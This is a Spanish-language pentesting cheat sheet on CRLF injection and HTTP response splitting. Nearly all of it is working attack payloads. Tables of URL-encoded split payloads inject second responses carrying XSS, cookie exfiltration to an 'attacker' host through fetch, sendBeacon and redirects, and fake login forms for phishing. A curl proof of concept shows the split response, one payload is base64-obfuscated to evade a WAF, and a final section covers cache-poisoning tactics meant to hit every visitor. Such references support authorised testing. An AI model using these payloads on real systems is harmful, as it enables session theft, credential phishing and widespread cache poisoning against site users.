---
aliases:
  - HTTP Response Splitting
  - Response Splitting XSS
  - Body Injection via CRLF
tags:
  - vuln/crlf-injection
  - technique/initial-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[CRLF Injection]]"
  - "[[Cross-Site Scripting (XSS)]]"
---
# CRLF Injection - HTTP Response Splitting

***

## Split — Forzar fin de headers + segunda respuesta

| **Payload (param URL)** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?url=ok%0d%0a%0d%0a<html>SPLIT</html>` | `\r\n\r\n` cierra headers → body atacante reflejado | Test mínimo de splitting viable. |
| `?url=ok%0d%0aContent-Length:%2026%0d%0a%0d%0a<html>SPLIT-MARKER</html>` | Body delimitado por `Content-Length` correcta | Splitting con Content-Length pre-calculada. |
| `?url=ok%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>poison</h1>` | Status-line + headers + body de segunda respuesta completa | Pipeline HTTP/1.1, proxy pre-cache. |
| `?url=ok%0d%0aSet-Cookie:%20a=1%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<x>` | Set-Cookie + segunda respuesta combinadas | Multi-effect en una sola injección. |
^crlfi-split-twores

___

## Inject Second Response con HTML/JS

| **Payload (segunda respuesta inyectada)** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2050%0d%0a%0d%0a<script>alert(document.domain)</script>` | XSS ejecutado del dominio víctima | PoC clásico XSS via splitting. |
| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>fetch('//attacker/?c='+document.cookie)</script>` | Cookie exfil hacia atacante | XSS con cookie theft. |
| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<form action="//attacker/log" method=post><input name=u><input name=p><button>Login</button></form>` | Form phishing en dominio víctima | Phishing con HTTPS válido. |
| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<meta http-equiv="refresh" content="0;url=//attacker">` | Redirección forzada | Sin JS — cumple CSP `script-src 'none'`. |
| `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<iframe src="//attacker/c2.html" style="position:fixed;width:100%;height:100%"></iframe>` | UI Overlay / clickjacking persistente | Stored vía cache poisoning. |
^crlfi-split-secondres

### PoC HTTP Response Splitting

```bash
PAYLOAD='ok%0d%0aSet-Cookie:atacante=1%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20100%0d%0a%0d%0a<html><body><script>alert(document.cookie)</script></body></html>'

curl -i "https://target.com/redirect?url=$PAYLOAD"

# Server response (raw):
# HTTP/1.1 302 Found
# Location: ok
# Set-Cookie: atacante=1                  ← inyectada
#
# HTTP/1.1 200 OK                         ← segunda respuesta inyectada
# Content-Type: text/html
# Content-Length: 100
#
# <html><body><script>alert(document.cookie)</script></body></html>
#
# Browser interpreta segunda respuesta → XSS ejecuta.
# Proxy/cache puede almacenar split response → impacto masivo.
```

___

## XSS via Response Splitting

| **Payload XSS embebido en split** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>document.location='//attacker/?c='+document.cookie</script>` | Cookie steal + redirección | XSS clásico con exfil. |
| `<script>navigator.sendBeacon('//attacker/log',document.cookie)</script>` | Exfil silenciosa (beacon survives navigate) | Stealth. |
| `<iframe srcdoc="<script>parent.postMessage(document.cookie,'*')</script>"></iframe>` | Bypass CSP `script-src` mediante srcdoc | App con CSP que permite frames. |
| `<svg onload=fetch('//attacker/?c='+document.cookie)>` | XSS sin `<script>` — bypass blacklist | WAF filtra `<script>`. |
| `<script>eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIvP2M9JytkLm…'))</script>` | Payload base64 ofuscado | WAF filtra strings literales. |
^crlfi-split-xss

___

## Cache Poisoning via Splitting

| **Combinación** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `%0d%0aCache-Control:%20public,%20max-age=31536000%0d%0a%0d%0a<html>XSS</html>` | Cache guarda response con XSS body por 1 año | CDN/proxy honra cache-control. |
| Inyectar split en parámetro **unkeyed** (header reflejado pero no en cache key) | Cache poisoning con clave normal — todas las víctimas ven XSS | Web Cache Poisoning clásico via CRLF. |
| Combinar con `X-Forwarded-Host` / `X-Host-Override` inyectados | Cache poisoning + Host Header Injection | Multi-vector. |
| Split + `Vary: User-Agent` removido | Forzar single cache entry para todos los UAs | Maximizar alcance. |
| Split en endpoint cacheable (`/static/*`, `/api/public/*`) | Persistencia hasta TTL expiration | Identificar surface cacheable previo. |
^crlfi-split-cache

***
